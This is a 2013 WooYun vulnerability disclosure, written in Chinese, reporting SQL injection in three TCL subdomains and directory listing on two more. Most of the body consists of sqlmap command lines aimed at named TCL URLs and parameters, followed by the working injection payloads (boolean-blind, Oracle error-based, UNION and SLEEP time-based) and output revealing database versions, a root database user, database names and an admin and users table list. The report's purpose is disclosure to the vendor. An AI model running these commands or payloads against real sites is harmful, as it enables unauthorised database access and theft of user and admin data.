wybug_title: TCL#三个分站存在SQL注射漏洞
wybug_detail:
漏洞详情 披露状态：   									2013-11-19：	细节已通知厂商并且等待厂商处理中									2013-11-19：	厂商已经确认，细节仅向厂商公开									2013-11-29：	细节向核心白帽子及相关领域专家公开									2013-12-09：	细节向普通白帽子公开									2013-12-19：	细节向实习白帽子公开									2014-01-03：	细节向公众公开  简要描述： TCL#三个分站存在SQL注射漏洞，求RANK20，求给力。 详细说明：  站点1：http://callcenter.tcl.com%7bactionForm.issue_time%7d参数没有过滤，导致注射sqlmap跑起来sqlmap.py -u "http://callcenter.tcl.com/tclcc/portlets/downloading/jstbxzflow/queryDealer.do" --data "%7bactionForm.issue_time%7d=1" --dbs --current-user --current-dbPlace: POSTParameter: {actionForm.issue_time}    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: {actionForm.issue_time}=1' AND 9186=9186 AND 'hepE'='hepE    Type: error-based    Title: Oracle AND error-based - WHERE or HAVING clause (XMLType)    Payload: {actionForm.issue_time}=1' AND 1620=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(101)||CHR(103)||CHR(109)||CHR(58)||(SELECT (CASE WHEN (1620=1620) THEN 1 ELSE 0 END) FROM DUAL)||CHR(58)||CHR(99)||CHR(102)||CHR(112)||CHR(58)||CHR(62))) FROM DUAL) AND 'SneB'='SneB---[16:11:32] [INFO] the back-end DBMS is Oracleweb server operating system: Windowsweb application technology: JSP, Apache 2.0.53back-end DBMS: Oracle[16:11:32] [INFO] fetching current user[16:11:32] [INFO] resumed: TCLKINGcurrent user:    'TCLKING'[16:11:32] [INFO] |+--------------------------------+--------------------------------我是分割线--------------------------------站点2：www.tclbattery.comid参数没有过滤，导致注射漏洞sqlmao跑起来sqlmap.py -u "www.tclbattery.com/read_news.php?id=1" --dbs --current-user --current-db[root@Hacker~]# Sqlmap sqlmap.py -u "www.tclbattery.com/read_news.php?id=1" --dbs --current-user --current-db    sqlmap/1.0-dev - automatic SQL injection and database takeover tool    http://sqlmap.org[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicablelocal, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program[*] starting at 16:22:44[16:22:44] [INFO] resuming back-end DBMS 'mysql'[16:22:44] [INFO] testing connection to the target urlsqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Place: GETParameter: id    Type: UNION query    Title: MySQL UNION query (NULL) - 7 columns    Payload: id=1 LIMIT 1,1 UNION ALL SELECT NULL, CONCAT(0x3a6c6d6e3a,0x726d41654f4c44636e57,0x3a76726b3a), NULL, NULL, NULL, NULL, NULL#---[16:22:45] [INFO] the back-end DBMS is MySQLweb server operating system: Windows 2003web application technology: Microsoft IIS 6.0, PHP 4.3.4back-end DBMS: MySQL 4[16:22:45] [INFO] fetching current usercurrent user:    'jacky@%'[16:22:45] [INFO] fetching current databasecurrent database:    'battery'[16:22:45] [WARNING] information_schema not available, back-end DBMS is MySQL <5. database names will be fetched from 'mysql' database[16:22:45] [INFO] falling back to current database[16:22:45] [INFO] fetching current databaseavailable databases [1]:[*] battery---------------------------我是分割线-------------------------------------站点3：http://tclcom.tcl.com  与 WooYun: TCL#两个分站存在SQL注射漏洞 属于同一站点，注入点不同。classid参数没有过滤，导致注射漏洞sqlmap跑起来sqlmap.py -u "http://tclcom.tcl.com/php/load_articles.php?lang=null&page=cnews&type=1" -p "type" --dbs --current-user --current-dbPlace: GETParameter: type    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: lang=null&page=cnews&type=1 AND 1636=1636    Type: AND/OR time-based blind    Title: MySQL > 5.0.11 AND time-based blind    Payload: lang=null&page=cnews&type=1 AND SLEEP(5)---[18:42:52] [INFO] the back-end DBMS is MySQLweb server operating system: Linux Debian or Ubuntu 6.0 (squeeze)web application technology: PHP 5.3.3, Apache 2.2.16back-end DBMS: MySQL 5.0.11[18:42:52] [INFO] fetching current user[18:42:52] [INFO] resumed: root@localhostcurrent user:    'root@localhost'[18:42:52] [INFO] fetching current database[18:42:52] [INFO] resumed: tcl_biscurrent database:    'tcl_bis'[18:42:52] [INFO] fetching database names[18:42:52] [INFO] fetching number of databases[18:42:52] [INFO] resumed: 3[18:42:52] [INFO] resumed: information_schema[18:42:52] [INFO] resumed: mysql[18:42:52] [INFO] resumed: tcl_bisavailable databases [3]:[*] information_schema[*] mysql[*] tcl_bisDatabase: tcl_bis[20 tables]+---------------------------------------+| admin || articles || career_categories || categories || directors || directorscat || events || financial_values || languages || links || media || offers || pages || pdf_research || research_report || result_announcement || sessions || text || unit_sales || users |+---------------------------------------+另外送2个站点的目录遍历1、http://xjd.tcl.com:8008/activex/2、http://www.tclbusiness.com/uploadfile/



   漏洞证明：  已经证明   修复方案：  1、过滤2、屏蔽列目录   版权声明：转载请注明来源 Mr.leo@乌云
wybug_reply: 漏洞回应  厂商回应： 危害等级：高 漏洞Rank：20  确认时间：2013-11-19 22:06 厂商回复： 感谢您的工作，已转交相关单位确认处理。 最新状态： 暂无
